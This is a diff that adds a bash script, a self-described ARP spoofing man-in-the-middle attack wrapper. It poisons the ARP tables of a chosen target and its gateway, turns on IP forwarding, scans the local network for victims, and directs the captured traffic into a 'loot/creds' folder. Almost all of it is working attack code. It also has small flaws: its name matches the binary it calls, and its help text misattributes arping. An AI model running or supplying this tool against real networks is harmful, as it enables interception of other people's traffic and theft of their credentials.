@@ -1,0 +1,171 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/arpspoof
+# ARP spoofing MITM attack wrapper
+# Usage: arpspoof <mode> [options]
+# Modes: start, stop, scan, restore, help
+
+LOOT="/opt/cardputer/loot/creds"
+CONF_DIR="/opt/cardputer/config/arpspoof"
+PID_DIR="/tmp/arpspoof"
+mkdir -p "$LOOT" "$CONF_DIR" "$PID_DIR"
+
+check_deps() {
+    for cmd in arpspoof tcpdump; do
+        if ! command -v "$cmd" &>/dev/null; then
+            echo "[!] $cmd not found. Install: apt install dsniff tcpdump"
+            exit 1
+        fi
+    done
+}
+
+case "${1:-help}" in
+    start|--start|-s)
+        check_deps
+        TARGET="${2:-}"
+        GATEWAY="${3:-}"
+        IFACE="${4:-eth0}"
+
+        if [ -z "$TARGET" ] || [ -z "$GATEWAY" ]; then
+            echo "Usage: arpspoof start <target_ip> <gateway_ip> [iface]"
+            echo ""
+            echo "Start ARP spoofing MITM between target and gateway."
+            echo ""
+            echo "Example: arpspoof start 192.168.1.100 192.168.1.1 wlan0"
+            exit 1
+        fi
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] ARP Spoofing MITM Attack"
+        echo "[*] Target: $TARGET"
+        echo "[*] Gateway: $GATEWAY"
+        echo "[*] Interface: $IFACE"
+        echo ""
+
+        # Enable IP forwarding
+        echo 1 > /proc/sys/net/ipv4/ip_forward
+        echo "[+] IP forwarding enabled"
+
+        # Start ARP spoofing (target -> gateway)
+        arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" > /dev/null 2>&1 &
+        PID1=$!
+        echo "$PID1" > "$PID_DIR/target2gw.pid"
+
+        # Start ARP spoofing (gateway -> target)
+        arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" > /dev/null 2>&1 &
+        PID2=$!
+        echo "$PID2" > "$PID_DIR/gw2target.pid"
+
+        echo "[+] ARP spoofing active"
+        echo "[+] Target->Gateway PID: $PID1"
+        echo "[+] Gateway->Target PID: $PID2"
+        echo ""
+        echo "[*] Capture traffic with:"
+        echo "    tcpdump -i $IFACE -w $LOOT/arpspoof_$(date +%Y%m%d_%H%M%S).pcap host $TARGET"
+        echo ""
+        echo "[+] Stop with: arpspoof stop"
+        echo "[+] Restore with: arpspoof restore $TARGET $GATEWAY $IFACE"
+
+        # Wait for interrupt
+        echo "[*] Press Ctrl+C to stop..."
+        wait "$PID1" "$PID2" 2>/dev/null || true
+        ;;
+
+    stop|--stop|-S)
+        echo "[*] Stopping ARP spoofing..."
+
+        for pidfile in "$PID_DIR"/*.pid; do
+            [ -f "$pidfile" ] || continue
+            PID=$(cat "$pidfile")
+            if kill -0 "$PID" 2>/dev/null; then
+                kill "$PID" 2>/dev/null
+                echo "[+] Killed PID: $PID"
+            fi
+            rm -f "$pidfile"
+        done
+
+        # Kill any remaining arpspoof processes
+        pkill -f arpspoof 2>/dev/null || true
+
+        # Disable IP forwarding
+        echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
+        echo "[+] IP forwarding disabled"
+        echo "[+] ARP spoofing stopped"
+        echo "[!] Run: arpspoof restore <target> <gateway> <iface>"
+        ;;
+
+    restore|--restore|-r)
+        TARGET="${2:-}"
+        GATEWAY="${3:-}"
+        IFACE="${4:-eth0}"
+
+        if [ -z "$TARGET" ] || [ -z "$GATEWAY" ]; then
+            echo "Usage: arpspoof restore <target_ip> <gateway_ip> [iface]"
+            exit 1
+        fi
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] Restoring ARP tables..."
+        # Send gratuitous ARP to restore correct mappings
+        arping -c 3 -I "$IFACE" "$GATEWAY" 2>/dev/null || true
+        arping -c 3 -I "$IFACE" -s "$GATEWAY" "$TARGET" 2>/dev/null || true
+        echo "[+] ARP tables restored"
+        ;;
+
+    scan|--scan|-sc)
+        IFACE="${2:-eth0}"
+
+        if [ "$(id -u)" -ne 0 ]; then
+            echo "[!] Root required."
+            exit 1
+        fi
+
+        echo "[*] ARP Scanning for targets on $IFACE..."
+        echo ""
+        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
+        echo "[*] Default gateway: $GATEWAY"
+        echo ""
+        echo "[*] Live hosts:"
+        arp-scan --interface="$IFACE" --localnet 2>/dev/null | tail -n +3 | head -n -3 || \
+        arping -c 1 -I "$IFACE" "$GATEWAY" 2>/dev/null
+        echo ""
+        echo "[+] Use: arpspoof start <target_ip> $GATEWAY $IFACE"
+        ;;
+
+    help|--help|-h)
+        echo "Usage: arpspoof <mode> [options]"
+        echo ""
+        echo "ARP Spoofing MITM Attack Wrapper"
+        echo ""
+        echo "Modes:"
+        echo "  start <target> <gateway> [iface]  Start ARP spoofing MITM"
+        echo "  stop                               Stop all ARP spoofing"
+        echo "  restore <target> <gateway> [iface] Restore ARP tables"
+        echo "  scan [iface]                       Scan for live hosts"
+        echo ""
+        echo "Examples:"
+        echo "  sudo arpspoof start 192.168.1.100 192.168.1.1 wlan0"
+        echo "  sudo arpspoof stop"
+        echo "  sudo arpspoof restore 192.168.1.100 192.168.1.1 wlan0"
+        echo ""
+        echo "Capture traffic (while spoofing is active):"
+        echo "  tcpdump -i wlan0 -w loot.pcap host 192.168.1.100"
+        echo ""
+        echo "Requirements: dsniff (arping, arpspoof), tcpdump"
+        exit 0
+        ;;
+
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: arpspoof help"
+        exit 1
+        ;;
+esac
